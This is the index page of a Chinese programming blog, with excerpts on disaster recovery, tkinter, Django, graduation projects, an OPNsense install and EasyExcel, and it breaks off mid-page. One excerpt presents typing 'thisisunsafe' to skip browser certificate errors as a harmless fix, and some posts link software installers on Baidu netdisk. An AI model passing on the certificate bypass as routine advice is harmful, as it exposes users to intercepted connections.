<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/755654730cf34e743a8dec2013b27a81/" rel="bookmark">
			灾备，两地三中心
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当前 市场上常见的 容灾 模式可分为同城容灾、异地容灾、 双活 数据中心、 两地 三中心几种。
1、 同城 容灾
同城 容灾 是在同城或相近区域内 （ ≤ 200K M ）建立两个数据中心 : 一个为数据中心，负责日常生产运行 ; 另一个为灾难备份中心，负责在灾难发生后的应用系统运行。同城灾难备份的数据中心与灾难备份中心的距离比较近，通信线路质量较好，比较容易实现数据的同步 复制 ，保证高度的数据完整性和数据零丢失。同城灾难备份一般用于防范火灾、建筑物破坏、供电故障、计算机系统及人为破坏引起的灾难。
2、 异地 容灾
异地 容灾 主备中心之间的距离较远 （＞ 200KM ) ， 因此一般采用异步镜像，会有少量的数据丢失。异地灾难备份不仅可以防范火灾、建筑物破坏等可能遇到的风险隐患，还能够防范战争、地震、水灾等风险。由于同城灾难备份和异地灾难备份各有所长，为达到最理想的防灾效果，数据中心应考虑采用同城和异地各建立一个灾难备份中心的方式解决。
本地容灾 是指在本地机房建立容灾系统，日常情况下可同时分担业务及管理系统的运行，并可切换运行；灾难情况下可在基本不丢失数据的情况下进行灾备应急切换，保持业务连续运行。与异地灾备模式相比较，本地双中心具有投资成本低、建设速度快、运维管理相对简单、可靠性更高等优点；异地灾备中心是指在异地建立一个备份的灾备中心，用于双中心的数据备份，当双中心出现自然灾害等原因而发生故障时，异地灾备中心可以用备份数据进行业务的恢复。
本地机房的容灾主要是用于防范生产服务器发生的故障，异地灾备中心用于防范大规模区域性灾难。本地机房的容灾由于其与生产中心处于同一个机房，可通过局域网进行连接，因此数据复制和应用切换比较容易实现，可实现生产与灾备服务器之间数据的实时复制和应用的快速切换。异地灾备中心由于其与生产中心不在同一机房，灾备端与生产端连接的网络线路带宽和质量存在一定的限制，应用系统的切换也需要一定的时间，因此异地灾备中心可以实现在业务限定的时间内进行恢复和可容忍丢失范围内的数据恢复。
3、 两地 三中心
结合近年国内出现的大范围自然灾害，以同城双中心加异地灾备中心的 “两地三中心”的灾备模式也随之出现，这一方案兼具高可用性和灾难备份的能力。
同城双中心 是指在同城或邻近城市建立两个可独立承担关键系统运行的数据中心，双中心具备基本等同的业务处理能力并通过高速链路实时同步数据，日常情况下可同时分担业务及管理系统的运行，并可切换运行；灾难情况下可在基本不丢失数据的情况下进行灾备应急切换，保持业务连续运行。与异地灾备模式相比较，同城双中心具有投资成本低、建设速度快、运维管理相对简单、可靠性更高等优点。
异地灾备中心 是指在异地的城市建立一个备份的灾备中心，用于双中心的数据备份，当双中心出现自然灾害等原因而发生故障时，异地灾备中心可以用备份数据进行业务的恢复。
两地三中心 ： 是指 同城双中心 加 异地灾备 一种商用容灾备份解决方案；
两地 是指同城、异地；
三中心 是指生产中心、同城容灾中心、异地容灾中心。（ 生产中心、同城灾备中心、异地 灾备 中心 ）
4、 双活 数据中心
所谓 “ 双活 ” 或 “ 多 活 ” 数据中心，区别于 传统 数据中心 和 灾备中心的模式，前者 多个 或两个数据中心都处于运行当中， 运行相同的应用，具备同样的数据，能够提供跨中心业务负载均衡运行能力，实现持续的应用可用性和灾难备份能力， 所以称为 “双活 ” 和 “ 多 活 ” ；后者是 生产 数据中心投入运行， 灾备 数据中心处在不工作状态，只有当灾难发生时，生产数据中心瘫痪，灾备中心才启动。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/755654730cf34e743a8dec2013b27a81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26dd9f3ddc028ee1ede1576dabfb1fdb/" rel="bookmark">
			第一个tkinter程序（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录： 1.前言2.什么是tkinter？3.tkinter安装4.tkinter程序框架·(1)创建窗口·(2)窗口标题·(3)设置窗口大小·(4)基础控件——文字①普通文字②改变文字颜色③更改文本框背景颜色④改变字体及大小 ⒌预告附件📎 1.前言 最近我会更新几篇关于python中tkinter空间的文章，希望大家喜欢
2.什么是tkinter？ Tkinter 是使用 python 进行窗口视窗设计的模块。Tkinter模块(“Tk 接口”)是Python的标准Tk GUI工具包的接口。
tkinter作为 python 特定的GUI界面，是一个图像的窗口，tkinter是python自带的，可以编辑的GUI界面，用来入门。
3.tkinter安装 因为tkinter是自带库，不需要单独安装。我是用的是pycharm演示的
4.tkinter程序框架 ·(1)创建窗口 import tkinter as tk #导入模块库，并起一个别名，以后代码里方便调用 win= tk.Tk() #创建窗口 win.mainloop() #放在代码末尾，启动程序事件处理主循环，简单来说就是开始tkinter程序 ·(2)窗口标题 win.title(‘第一个tkinter程序’) #更改引号里的字即可 ·(3)设置窗口大小 win.geometry(‘600x300’) #第一个数是横坐标(x)，第二个数是竖坐标(y)中间用小写x分隔 ·(4)基础控件——文字 ①普通文字 f=tk.Label(win,text='Hello World') f.pack() #居中显示 变量名不必须是f，可以是其他的，但不能违背基本的变量起名原则
后续会讲解如何设置在固定位置
注意：Label要大写
②改变文字颜色 在f=tk.Label里添加fg参数
f=tk.Label(win,text='Hello World',fg=‘red’) #在fg参数的引号里更改颜色 ③更改文本框背景颜色 每个文本外都有文本框，我们是可以修改颜色的
在f=tk.Label里添加bg参数
④改变字体及大小 在f=tk.Label中添加font参数
f=tk.Label(win,text='Hello World',fg='red',bg='#000',font=('华文行楷',50)) 注意：要注意逻辑关系，最好写一个括号，字体名要用引号包裹，第二个数代表大小。这两个参数均可以省略
⒌预告 下次会更新文本输入框、把文本调节到固定位置、上传输入数据的用法
附件📎 下面是pycharm的安装程序，一共2个，任选一个安装即可
链接：https://pan.baidu.com/s/1-jOHsuFrknHC6BH7SwaI2Q
提取码：1234 （永久有效）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f39853da5d3f35c2330d2532cf83246/" rel="bookmark">
			【洛谷】P1152 欢乐的跳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目传送门：P1152 欢乐的跳
欢乐的跳 题目描述 一个 n n n 个元素的整数数组，如果数组两个连续元素之间差的绝对值包括了 [ 1 , n − 1 ] [1,n-1] [1,n−1] 之间的所有整数，则称之符合“欢乐的跳”，如数组 { 1 , 4 , 2 , 3 } \{1,4,2,3\} {1,4,2,3} 符合“欢乐的跳”，因为差的绝对值分别为： 3 , 2 , 1 3,2,1 3,2,1。
给定一个数组，你的任务是判断该数组是否符合“欢乐的跳”。
输入格式 每组测试数据第一行以一个整数 n ( 1 ≤ n ≤ 1000 ) n(1 \le n \le 1000) n(1≤n≤1000) 开始，接下来 n n n 个空格隔开的在 [ − 1 0 8 , 1 0 8 ] [-10^8,10^8] [−108,108] 之间的整数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f39853da5d3f35c2330d2532cf83246/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20219f2b167c7a1b1d1c93dd4531bbb8/" rel="bookmark">
			Django框架搭建之学生管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学生管理系统 一、创建工程 1.创建工程(控制台)
django-adminstartproject工程名字
django-adminstartprojectstudentmanager
2.检验工程是否搭建成功(命令在控制台输入，链接在浏览器访问)
pythonmanage.pyrunserver
默认ip和端口: http://127.0.0.1:8000/
3.根据需要调整设置信息(studentmanage/settings.py)
# 界面语言
LANGUAGE_CODE='zh-Hans'
# 时区
TIME_ZONE='Asia/Shanghai'
说明：1.django默认工作在调试Debug模式下, 如果增加、修改、删除文件，服务器会自动重启。2.ctrl+c停止服务器。
二、创建子应用 1.在django中，创建子应用模块目录仍然可以通过命令来操作（控制台），即：
python manage.py startapp 子应用名称
manage.py为上述创建工程时自动生成的管理文件。
例如，在刚才创建的bookmanager工程中，想要创建一个用户book子应用模块，可执行：
cd .\bookmanager\
python manage.py startapp book
执行后，可以看到工程目录中多出了一个名为book的子目录。
2.将子应用在项目工程中注册（studentmanage/settings.py）
INSTALLED_APPS= [
'django.contrib.admin',
'django.contrib.auth',
'django.contrib.contenttypes',
'django.contrib.sessions',
'django.contrib.messages',
'django.contrib.staticfiles',
'student.apps.StudentConfig'
]
3.注册编译子应用的模型类
1.注册子应用的模型类(student/admin.py)
fromdjango.contribimportadmin
fromstudent.modelsimportStudentInfo, TeacherInfo
​
# Register your models here.
admin.site.register(TeacherInfo)
admin.site.register(StudentInfo)
2.编译子应用的模型类(student/models.py)
fromdjango.dbimportmodels
​
# Create your models here.
# 准备教师、学生列表信息的模型类
classTeacherInfo(models.Model):
tname=models.CharField(max_length=20, null=True, verbose_name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20219f2b167c7a1b1d1c93dd4531bbb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9cf4961e6041a23f9251650abb7d834/" rel="bookmark">
			浏览器显示你的连接不是专用连接怎么解决？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		直接上问题截图：
当你的chorme或edge浏览器打开网页遇到这个问题的时候，不要再去改配hosts、修改DNS地址、不修改WLAN属性了.....
你只需要：
1.将键盘调整为英文输入状态；
2.刷新一下页面，鼠标点击当前页面任意位置；
3.依次按键：thisisunsafe(这里注意：是un，不要多打s成sun了)；
4.按完上面的按键，页面会自动刷新，然后就可以正常访问了(如果没响应可以点一下回车)。
原理：
第一次看到这个方法的时候以为只是开玩笑闹着玩，没想到雀氏牛。原理其实就是一个Chromium内置的后门(edge也是基于chorme)，特地写成 thisisunsafe 就是让使用者不要滥用这个功能(之前叫 `badidea` )，输入之后就会忽略证书错误。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44a605c1c4d05e6cde718a96491d7067/" rel="bookmark">
			【php毕业设计】基于php&#43;mysql&#43;apache的subversion用户管理系统设计与实现（毕业论文&#43;程序源码）——用户管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于php+mysql+apache的subversion用户管理系统设计与实现（毕业论文+程序源码） 大家好，今天给大家介绍基于php+mysql+apache的subversion用户管理系统设计与实现，文章末尾附有本毕业设计的论文和源码下载地址哦。需要下载开题报告PPT模板及论文答辩PPT模板等的小伙伴，可以进入我的博客主页查看左侧最下面栏目中的自助下载方法哦
文章目录：
基于php+mysql+apache的subversion用户管理系统设计与实现（毕业论文+程序源码）1、项目简介2、资源详情3、关键词：4、毕设简介5、资源下载 1、项目简介 本系统主要是基于Web的subversion系统的用户管理系统。在开源软件世界，并行版本系统(cvs)一直是版本控制长久以来的唯一选择，但是，和其它许多工具一样，cvs开始显露出衰老的迹象，而subversion，正是以cvs继任者的面目出现的新型版本控制系统。但是，它的用户管理机制却是很差，本系统正是基于这个现实。实现友好的subversion用户界面，以提高工作效率。
subversion用户管理系统分为两大基本部分，一个是普通用户的注册及自己资料的修改和管理。另外一个主要部分是超级用户对于普通用户的申请进行认证。以及对通过认证的用户分配相应的权限。
本系统是基于apache和php平台的Web应用程序。采用php人作为前台开发语言。Mysql作为后台数据库。apache作为服务器对subversion用户进行管理。系统具有良好的稳定性，并具有可移植性强等特点。
2、资源详情 项目难度：中等难度
适用场景：相关题目的毕业设计
配套论文字数：8443个字28页
包含内容：整套源码+完整毕业论文
3、关键词： Php；Subversion；Apache；用户管理 4、毕设简介 提示：以下为毕业论文的简略介绍，项目源码及完整毕业论文下载地址见文末。
引 言
省略
subversion是一个自由/开源的版本控制系统。也就是说，在subversion管理下，文件和目录可以超越时空。subversion将文件存放在中心版本库里。这个版本库很像一个普通的文件服务器，不同的是，它可以记录每一次文件和目录的修改情况。于是我们就可以籍此将数据回复到以前的版本，并可以查看数据的更改细节。正因为如此，许多人将版本控制系统当作一种神奇的“时间机器”。
subversion的版本库可以通过网络访问，从而使用户可以在不同的电脑上进行操作。从某种程序上来说，允许用户在各自的空间里修改和管理同一组数据可以促进团队协作。因为修改不再是单线进行(单线进行也就是必须一个一个进行)，开发进度会进展迅速。此旬，由于所有的工作都已版本化，也就不必担心由于错误的更改而影响软件质量—如果出现不正确的更改，只要撤销那一次更改操作即可。
某些版本控制系统本身也是软件配置管理(SCM)系统，这种系统经过精巧的设计，专门且来管理源代码树，并且具备许多与软件开发有关的特性—比如，对编程语言的支持，或者提供程序构建工具。不过subversion并不是这样的系统。它是非曲直一个通用系统，可以管理任何类型的文件集。对你来说，这些文件这可能是源程序—页对别人，则可能是一个货物清单或者是数字电影。
但是subversion的用户管理机制却是很差的.从而需要一个关于subversion的用户管理系统.在本系统中,它可以使得正在使用subversion的某一项工程的人们,可以通过网络来管理自己的用户资料.而管理员也可以通过这个系统来管理用户.包括对用户最终基本的认证管理和权限管理.
subversion用户管理系统有两大主要模块.一个用户认证注册模块.另一个主要的模块是管理员的管理模块.当某位用户需要加入到某一项工程当中的时候.就可以通过网络来注册自己的用户.而管理员模块则可以对注册的用户进行认证.通过认证后可以分配相当的权限.这样就是完成了一个简单的用户管理过程。
而我所需要做的则是以下工作：
首先实现subversion和Apache的整合配置，使用apache的WebDAV接口来访问subversion的版本库。然后使用Apache的数据库验证模块来对subversion库的访问权限进行限制。因为验证信息存放在数据库中，可以使用脚本编程实现界面对用户进行添加删除和修改操作。subversion对目录的权限保存在subversion的配置文件当中。可以使用脚本对配置文件进行修改，从而进一步完善subversion的权限管理。编写WEB界面对后台的脚本进行调用，使得可以通过WEB界面对subversion的配置文件进行一定的修改。
2系统需求分析
subversion是一个自由/开源的版本控制系统。现在subversion也得到了很广泛的使用。但是subversion的用户管理机制却是很差的。从而需要一个关于subversion的用户管理系统.在本系统中，它可以使得正在使用subversion的某一项工程的人们，可以通过网络来管理自己的用户资料。而管理员也可以通过这个系统来管理用户。包括对用户最终基本的认证管理和权限管理。以及最后生成subversion权限配置文件。
2.1系统功能模块需求
2.1.1用户注册模块的需求
用户注册模块能够满足用户的注册。包括用户的资料管理、修改等等。
2.1.2管理员功能处理模块的需求
此模块能够满足管理员对注册的用户进行管理，包括对注册的用户进行审核通过。对审核通过的用户进行删除，分配权限。以及能够使数据库当中的数据能够生成subversion权限配置文件。
2.1.3各个功能模块数据结构图
2.2用户环境需求
2.2.1用户使用环境需求
1、硬件需求：计算机一台
2、操作系统：Windows XP/2000
3、开发语言：php
4、服务器工具：apache
5、数据库：mysql
6、其它工具：subversion
2.2.2其它需求
完成系统需求平台的搭建。即apache+php+mysql+subversion等工具的整合和配置。
3系统总体设计
3.1系统功能模块划分
subversion用户管理系统有两大主要模块：一个用户认证注册模块。另一个主要的模块是管理员的管理模块。当某位用户需要加入到某一项工程当中的时候，就可以通过网络来注册自己的用户。而管理员模块则可以对注册的用户进行认证。通过认证后可以分配相当的权限。其中的数据处理在mysql数据库当中完成。最后由数据库当中表的数据生成subversion权限配置文件。这样就是完成了一个简单的用户管理过程。
3.2系统功能模块流程图
图2 系统功能模块流程图
3.3数据库总体设计
在数据库svn_usr中包含了如下的一些表以及它们各自的作用。
表1 数据库中的表
4环境选择、搭建和配置
4.1选择使用apache+php+mysql的可行性以及各自特点
4.1.1使用apache+php+mysql的可行性
本系统是基于subversion的用户管理系统。它的要求是在Web页面下完成对用户注册模块的管理和管理员模块的管理。这使得我们生产首先必须建立一个Web平台。而subversion作为一个开源软件。那么我做的这个关于subversion的用户管理系统更要发扬这一种开源精神。并且从这个系统的实际用户出发，在从一系统中的开发语言、数据库和Web服务器中选择了apache、php和mysql这样的组合。最重要的是它们都开源软件，选择它们具有很强的经济优势，使得本系统具有开源的特性，可以免费的发布、修改、使用等等。
4.1.2 php技术的特点
(1)开放源代码
PHP在“The PHP License,version 2.02”协议下发行，实际上也是一种自由的软件。一方面，任何人都可以得到并修改源代码；另一方面，不必主拥有和使用PHP支付任何费用。
(2)跨平台
目前版本的PHP支持Windows 95/98/me、Windows NT/Workstation、Windows 2000 Professional/Server,以及各种版本的UNIX，如Linux、Solaris UNIX、SCO UNIX等。用PHP开发网页代码可以很容易地移植到不同的系统平台上。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44a605c1c4d05e6cde718a96491d7067/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/975d07771a98ac8024ce726e510f53df/" rel="bookmark">
			java毕业设计——基于java&#43;Servlet&#43;jsp的网上花店销售系统设计与实现（毕业论文&#43;程序源码）——网上花店销售系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于java+Servlet+jsp的网上花店销售系统设计与实现（毕业论文+程序源码） 大家好，今天给大家介绍基于java+Servlet+jsp的网上花店销售系统设计与实现，文章末尾附有本毕业设计的论文和源码下载地址哦。需要下载开题报告PPT模板及论文答辩PPT模板等的小伙伴，可以进入我的博客主页查看左侧最下面栏目中的自助下载方法哦
文章目录：
基于java+Servlet+jsp的网上花店销售系统设计与实现（毕业论文+程序源码）1、项目简介2、资源详情3、关键词：4、毕设简介5、资源下载 1、项目简介 网上花店销售系统采用JSP+Servlet+JavaBean的MVC模式，将数据对象、业务逻辑以及用户界面分离。该系统分为用户和管理员两个角色。用户注册登录后可以浏览鲜花，浏览公告，购买鲜花，管理员登录后可以对系统进行管理和维护。网上花店销售系统对于用户来说操作方便，满足了用户随时随地购买鲜花的需求，不仅为用户节省了时间，还提高了用户的购买效率。对于花店老板而言，不仅提高了销售效率还降低了时间和人工成本。 2、资源详情 项目难度：中等难度
适用场景：相关题目的毕业设计
配套论文字数：28648个字65页
包含内容：整套源码+完整毕业论文+答辩PPT+任务书+辅导视频+运行截图
3、关键词： 销售系统；JSP；MVC；网上花店 4、毕设简介 提示：以下为毕业论文的简略介绍，项目源码及完整毕业论文下载地址见文末。
1 绪论 1.1 现状分析
网上花店销售系统的实现不仅缩短了鲜花上市时间，节约了成本，方便了消费者购买，方便管理员管理，节约了大量时间和大量的人力物力，还增强了人们之间的感情交流等。
1.2 研究意义
省略
网上花店系统给用户提供了一整套完整的网上鲜花订购流程，使用户足不出户直接进行网上购物，给消费者带来了很大的方便。随着人类社会的发展，人际交往变得越来越重要。在这个繁忙的社会，人们很少有时间能见面交流感情，在特殊的日子里送给好友一束鲜花是用于联络感情的很好方式，因此受到广大消费者的欢迎。与此同时，商家也不再需要在商店里被动的等待顾客，完全可以坐在家里就轻松的卖出自己的商品，获得利润。计算机的存储与快速查询功能大大提高了网上花店管理的效率，并且还提高了查询并购买鲜花的精确度。方便快速的操作，不仅可减少从前的漏洞，还可以减少因工作的冗余出现的错误，更重要的是该系统的操作非常简单，推广起来比较容易。
1.3 研究方法
网上花店销售系统将采用瀑布模型的方式，先对目前鲜花销售的情况进行概述，然后对开发系统的环境以及技术进行简要介绍，之后对开发网上花店销售系统进行可行性分析、需求分析、总体设计、详细设计、编程实现以及测试直到实现最终理想的效果。本文将详细阐述整个实现过程。
2 系统的开发环境及技术简介
2.1 系统开发环境简介
1、MyEclipse简介
MyEclipse企业级工作平台作为对Eclipse IDE的扩展，它的功能体现在可以在数据库和JavaEE的开发、发布、应用程序服务器的整合方面极大的提高工作效率。MyEclipse几乎包括了目前所有主流开源产品的专属Eclipse开发工具，它作为功能丰富的JavaEE集成开发环境，在功能方面包括了完备的编码、调试、测试和发布，十分完整地支持HTML、Struts 2、Spring、JSP、CSS、JavaScript、Servlet、Hibernate、JDBC数据库链接工具等。JavaEE模型；Web开发工具；EJB开发工具；应用程序服务器的连接器；JavaEE项目部署服务；数据库服务；MyEclipse整合帮助是MyEclipse的7类特征。在Eclipse中，对于以上每一种功能上的类别都存在相应的功能部件，以及一系列可以用来实现它们的插件。MyEclipse这种结构上的模块化为它带来了很多优势，可以让开发人员在基本不影响其他模块的前提下，可以单独的扩展和升级任一模块。
2、Tomcat简介
Tomcat服务器是一个免费的开放源代码的Web应用服务器。运行时占用的系统资源小；扩展性好；支持负载平衡与邮件服务等开发应用系统常用的功能这几个特点使得其很受编程人员的喜欢。任何一个编程人员都可以更改它或在其中加入新的功能，因此Tomcat服务器还在不断的改进和完善中。 Tomcat是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是调试和开发JSP程序的第一选择。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache服务器，可利用它响应对HTML页面的访问请求。实际上Tomcat部分是Apache服务器的扩展，但它是独立运行的，所以当你运行Tomcat时，它实际上是作为一个与Apache独立的进程单独运行的。
3、SQL Server简介
SQL Server 是一个关系数据库管理系统，常用的有SQL Server 2000，SQL Server 2005，SQL Server 2008等版本。SQL Server 2008是微软公司2008年推出的数据库产品。它紧密结合了微软公司的各类主要产品，与Windows操作系统、Office办公软件、Visual Studio开发平台的最新技术进行了衔接。其各项指标在同类产品中都堪称优秀，而且图形化的管理界面十分便于学习与使用。SQL Server 2008具有很多新的特点，它是可信任的，使得公司可以以很高的安全性、可靠性和可扩展性来运行他们最关键任务的应用程序。它是高效的，使得公司可以降低开发和管理他们的数据基础设施的时间和成本。它是智能的，提供了一个全面的平台，可以在你的用户需要的时候给他发送观察和信息。
2.2 系统开发技术简介
1、JSP简介
JSP全称Java Server Pages，是一种动态网页开发技术。JSP页面由HTML代码和嵌入其中的Java代码所组成。服务器在页面被客户端请求以后对这些Java代码进行处理，然后将生成的HTML页面返回给客户端的浏览器。Servlet是JSP的技术基础，而且大型的Web应用程序的开发需要Servlet和JSP配合才能完成。JSP具备了Java技术简单易用的特点，完全地面向对象，具有平台无关性、主要面向因特网且安全可靠。简单的理解，JSP就是HTML页面+Java代码，但是JSP中能写的内容还不止这些，可以包含HTML标签，CSS，JavaScript，JAVA代码，EL表达式，引入并使用其他标签库，例如JSTL标签库、Struts 2标签库等。浏览器可以直接运行HTML页面，但是不能直接运行JSP页面，JSP是需要在拥有JSP引擎的服务器中运行的，例如Tomcat服务器。所以JSP是运行在服务器端的，运行完之后，把动态生成的HTML页面再使用IO流写回给浏览器，浏览器接收并且解析后再呈现出来效果。JSP的生命周期分为编译阶段，初始化阶段，执行阶段，销毁阶段。
2、Javabean简介
JavaBean 是一种Java语言写成的可重用组件。为了编写JavaBean，类必须是特定的和公共的，并且具有无参数的构造器。JavaBean通过提供一个符合一致设计模式的公共方法公开内部域的成员属性。众所周知，属性名与此模式相一致，其他java类可以通过自省机制发现和操纵这些JavaBean的属性。用户可以使用JavaBean将功能、处理、值、数据库访问和其他任何可以用java代码创造的对象进行打包，并且其他的开发者可以通过内部的JSP页面、Servlet、其他JavaBean程序或者应用来使用这些对象。用户可以认为JavaBean提供了一种随时随地的复制和粘贴的功能，而不用关心任何改变。JavaBean可分为两种：一种是有用户界面的JavaBean；还有一种是没有用户界面，主要负责处理事务（如数据运算，操纵数据库）的JavaBean。JSP通常访问的是后一种JavaBean。JavaBean是可复用的平台独立的软件组件，开发者可以在软件构造器工具中对其直接进行可视化操作。一个JavaBean由3部分组成：属性、方法、事件。
3、Servlet简介
Servlet是一个基于JAVA技术的Web组件，运行在服务器端，由Servlet容器所管理，用于生成动态的内容，Servlet是平台独立的Java类，编写一个Servlet实际上就是按照Servlet规范编写一个Java类，Servlet被编译为平台独立的字节码，可以被动态地加载到支持 Java技术的Web服务器中运行。Servlet容器也叫Servlet引擎，是Web服务器或者应用服务器的一部分，用户在发送请求和响应之上提供网络服务，Servlet不能独立运行，必须被部署到Servlet容器中，由容器实例化和调用Servlet的方法，Servlet容器在Servlet的生命周期内包含和管理Servlet。Servlet是单实例多线程的运行方式，每个请求在一个独立的线程中运行，提供服务的Servlet实例只有一个Servlet 具有可升级性，能响应更多的请求，因为Servlet容器使用一个线程而不是操作系统进程，线程占用的资源要小，Servlet使用标准的API，被更多的Web服务器所支持。Servlet使用Java语言编写，拥有更多的Java程序语言的优点，Servlet可以访问Java平台丰富的类库，使得各种应用的开发更为容易，Servlet容器给Servlet提供额外的功能。
4、JDBC简介
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/975d07771a98ac8024ce726e510f53df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dd65ce7ba38e19c66fb950a68752feb/" rel="bookmark">
			记OPNsense防火墙的安装过程 - 安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前些天在网上看到防火墙软件OPNsense，对其有了兴趣，以前写过一个其前面的一个软件M0n0wall( 关于m0n0wall的安装及配置 )，当时也是非常有名的防火墙，现在有了OPNsense，这个老防火墙已经停止更新了。
下面对OPNsense防火墙的安装进行介绍：
1、 下载ISO安装文件；
别去官网下载ISO，速度慢，而且是IMG格式。这里提供下载：
https://mirrors.aliyun.com/opnsense/releases/23.1/OPNsense-23.1-OpenSSL-dvd-amd64.iso.bz2?spm=a2c6h.25603864.0.0.37c91a64I1WaRs
或者百度云网盘：
链接：https://pan.baidu.com/s/1r6d1slP3CSDsWJVob5BetQ
提取码：600o
2、 准备虚拟机；
虚拟机，我这边使用的是VMWare workstation 17，提供下载：
链接：https://pan.baidu.com/s/1pXJHlsZcpDIyGeuFpQMYJA
提取码：lsag
1) 虚拟机的安装；
VMWare虚拟机，以前有写过：VMWare虚拟机安装 - 学习者系列文章 。
注意这里选择“其它”，FreeBSD操作系统。
2) 防护墙虚拟机的配置；
防火墙虚拟机，主要配置两个网卡，一个接外网，一个接内网。
3、 安装防火墙；
1) 设置虚拟机光驱ISO；
先设置虚拟机光驱文件为下载的ISO文件。
2) 安装；
A、打开虚拟机电源，显示安装窗口，等待启动。
B、输入installer ,opnsense账号密码(都是小写)打开安装界面；
C、开始安装；
设置一下密码(root的密码)：
结束后选下面项，退出重启；
这里看到LAN的IP不是虚拟机内网IP，需要设置一下，用root登录。
登录后选2，进入设置：
下面进行设置：
这时候会进行配置，然后完成后会显示：
如果可以，重启一下系统，然后用上面的http://192.168.150.129这个IP在虚拟机内网里的其它电脑的浏览器里进行打开就能够进行设置该防火墙了。
上面对防火墙OPNsense的安装过程进行了介绍，具体其配置后面感兴趣的再进行介绍。
Etc.今天是初八了，年还没过完，再次祝大家春节快乐。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aca8dea6751a39ced4bea81e06c7af7d/" rel="bookmark">
			基于EasyExcel锁定指定列导出数据到excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于EasyExcel锁定指定列导出数据到excel 大家好，我是llp。最近在做系统报表时,遇到一个需求，需要查询系统数据导出excel，并要求导出的excel列中有一些是锁定的有一些是不锁定的，其实就是实现动态列锁定的效果。
1.需求描述 要求导出的excel列中有一些时锁定的有一些时不锁定的，即使实现动态列锁定的效果。
需求图示 easyexcel基本使用： https://blog.csdn.net/qq_44981526/article/details/122052455 2.实现步骤 1.获取要导出的数据 示例代码
@GetMapping("/exportRiskDetailReport") @ApiOperation("风险排查明细统计导出") public void exportRiskDetailReport(DetailReportDto detailReportDto){ //1.结合实际业务查询数据 List&lt;DetailReportViewDto&gt; list = statisticsReportDomainService.riskDetailReport(premisesIdList, detailReportDto); //2.基于EasyExcel导出excel文件 EasyExcelUtil.excelLockExport(DetailReportViewDto.class, "风险排查明细统计数据"+DateUtil.format(new Date(), "yyyyMMddHHmmssS"), list, null); } 2.编写EasyExcel工具类 @Slf4j public class EasyExcelUtil { //导出excel指定锁定列 public static void excelLockExport(Class head, String excelname, List data, String sheetName) { ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes(); HttpServletResponse response = requestAttributes.getResponse(); response.setContentType("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"); response.setCharacterEncoding("utf-8"); try { // 这里URLEncoder.encode可以防止浏览器端导出excel文件名中文乱码 当然和easyexcel没有关系 String fileName = URLEncoder.encode(excelname, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aca8dea6751a39ced4bea81e06c7af7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
